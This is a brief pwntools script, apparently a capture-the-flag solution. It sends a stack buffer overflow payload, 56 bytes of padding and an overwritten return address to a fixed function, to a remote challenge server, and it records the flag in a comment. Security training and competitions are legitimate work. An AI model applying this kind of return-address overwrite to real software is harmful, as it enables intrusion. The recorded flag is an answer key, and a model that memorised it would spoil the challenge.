#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
# p = process(elf.path)
p = remote("103.162.14.116", 12005)
p.send(b'x' * (56) + p64(0x0000000000401186 + 1))

p.interactive()
# KCSC{bypass_strstr_by_null_byte}